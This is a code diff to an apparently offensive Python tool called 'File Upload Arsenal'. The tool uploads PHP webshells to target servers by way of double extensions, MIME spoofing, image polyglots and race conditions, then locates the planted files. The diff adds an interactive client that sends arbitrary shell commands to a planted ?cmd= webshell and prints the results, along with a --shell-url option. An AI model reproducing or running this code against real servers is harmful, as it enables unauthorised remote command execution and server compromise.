@@ -8,6 +8,7 @@ Features:
 - Modular test suites (basic, MIME, polyglot, path traversal, race condition).
 - Class-based design for reuse in CI/CD or internal tooling.
 - Structured findings with severity and description.
+- Optional interactive ?cmd= webshell client.
 """
 
 import argparse
@@ -36,7 +37,7 @@ def banner():
      \ V / / /|      / /   / __ \/ _ \/ ___/ //_/
       \ / / / |     / /___/ / / /  __/ /__/ ,<   
        \_/_/_/|_|____\____/_/ /_/\___/\___/_/|_|  
-                /_____/ File Upload Arsenal v3.1
+                /_____/ File Upload Arsenal v3.2
     {W}""")
 
 
@@ -82,7 +83,7 @@ def filename_variants(filename: str):
 def try_find_uploaded(base_url, filename, session, verbose=False):
     """
     Try common paths + name variants to find where the file is served,
-    so you can hit ?cmd= manually.
+    so you can hit ?cmd= manually or via interactive shell.
     """
     parsed = urlparse(base_url)
     base = f"{parsed.scheme}://{parsed.netloc}"
@@ -188,7 +189,6 @@ class FileUploadTester:
         """Direct .php and simple tricks (P0)."""
         self.info("Running BASIC upload tests (direct .php, double extensions)...")
 
-        # Use PHP_SHELL for all basic candidates so you can do ?cmd=
         candidates = [
             ("shell.php", PHP_SHELL, "application/x-php"),
             ("shell.php.jpg", PHP_SHELL, "image/jpeg"),
@@ -212,7 +212,6 @@ class FileUploadTester:
                     severity="Critical",
                     vuln_type="DirectUpload"
                 )
-                # Try to discover URL and print ready-to-use ?cmd= links
                 url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
                 if url:
                     self.success(
@@ -228,7 +227,6 @@ class FileUploadTester:
         """MIME/Content-Type bypass tests (P1)."""
         self.info("Running MIME/Content-Type bypass tests...")
 
-        # Also use PHP_SHELL so a MIME-bypassed upload can still be a shell
         payloads = [
             ("shell.jpg", PHP_SHELL, "image/jpeg"),
             ("shell.png", PHP_SHELL, "image/png"),
@@ -252,7 +250,6 @@ class FileUploadTester:
                     severity="Medium",
                     vuln_type="MIMEBypass"
                 )
-                # Optionally also try to find a reachable shell URL
                 url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
                 if url:
                     self.success(
@@ -269,7 +266,6 @@ class FileUploadTester:
             "jpegphp.jpg": polyglot_jpeg_php(),
             "pngphp.png": polyglot_png_php(),
             "gifphp.gif": polyglot_gif_php(),
-            # simple JS-in-PDF polyglot (no ?cmd= here, just bypass check)
             "pdfjs.pdf": (
                 b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R "
                 b"/OpenAction << /S /JavaScript /JS (app.alert('PDF-JS Polyglot')) >> >>\nendobj\n"
@@ -300,7 +296,6 @@ class FileUploadTester:
                         severity="Critical",
                         vuln_type="PolyglotBypass"
                     )
-                    # For the PHP image polyglots, this is also a shell
                     if fname in ("jpegphp.jpg", "pngphp.png", "gifphp.gif"):
                         url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
                         if url:
@@ -342,7 +337,6 @@ class FileUploadTester:
 
     def _race_worker(self, filename: str) -> bool:
         """Single race attempt."""
-        # Also use PHP_SHELL so if race wins, you get ?cmd= shell
         content = PHP_SHELL
         files = {self.param_name: (filename, content, "application/x-php")}
         upload_resp = self.session.post(self.target_url, files=files, timeout=10)
@@ -353,12 +347,9 @@ class FileUploadTester:
             return False
 
         access_url = self.access_pattern.format(filename=filename)
-        # Hit the URL a few times quickly
         for _ in range(10):
             try:
                 r = self.session.get(access_url, timeout=3)
-                # Simple check that something comes back; for real use, you can
-                # look for known markers or just rely on manual ?cmd= later.
                 if r.status_code == 200:
                     self.success(
                         f"Race condition: uploaded file reachable at {access_url}?cmd=id",
@@ -390,9 +381,45 @@ class FileUploadTester:
             for fut in futures:
                 try:
                     if fut.result():
-                        return  # stop on first success
+                        return
                 except Exception as e:
                     self.error(f"Race worker error: {e}")
+
+    # -------- Interactive ?cmd= shell -------- #
+
+    def interactive_shell(self, shell_url: str):
+        """
+        Simple interactive client for a ?cmd= webshell endpoint.
+
+        Usage:
+            tester.interactive_shell("https://target/uploads/shell.php")
+        Then type commands: id, ls -la, whoami, etc.
+        """
+        self.info(f"Starting interactive shell against: {shell_url}")
+        self.info("Type commands (or 'exit' / 'quit' to stop).")
+
+        while True:
+            try:
+                cmd = input(f"{G}cmd>{W} ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                break
+
+            if cmd.lower() in ("exit", "quit"):
+                break
+            if not cmd:
+                continue
+
+            try:
+                params = {"cmd": cmd}
+                r = self.session.get(shell_url, params=params, timeout=10)
+                print(f"{Y}--- response [{r.status_code}] ---{W}")
+                # print raw text; you can refine later
+                print(r.text.strip())
+                print(f"{Y}--------------------------{W}")
+            except Exception as e:
+                self.error(f"Request failed: {e}")
+                break
 
     # -------- Orchestrator -------- #
 
@@ -419,7 +446,7 @@ class FileUploadTester:
         for m in ordered:
             try:
                 available[m]()
-                time.sleep(0.5)  # light pacing
+                time.sleep(0.5)
             except KeyboardInterrupt:
                 self.error("Interrupted by user.")
                 break
@@ -480,6 +507,10 @@ def parse_args(argv=None):
              "e.g. https://target.com/uploads/{filename}"
     )
     parser.add_argument(
+        "--shell-url",
+        help="Existing webshell URL (e.g. https://target/uploads/shell.php) for interactive ?cmd= shell"
+    )
+    parser.add_argument(
         "-v", "--verbose", action="store_true",
         help="Verbose logging"
     )
@@ -511,6 +542,11 @@ def main(argv=None):
         with open(args.output, "w", encoding="utf-8") as f:
             f.write(report)
         print(f"\n{G}[+] Report saved to {args.output}{W}")
+
+    # If user supplied a shell URL, drop into interactive mode
+    if args.shell_url:
+        print()
+        tester.interactive_shell(args.shell_url)
 
 
 if __name__ == "__main__":
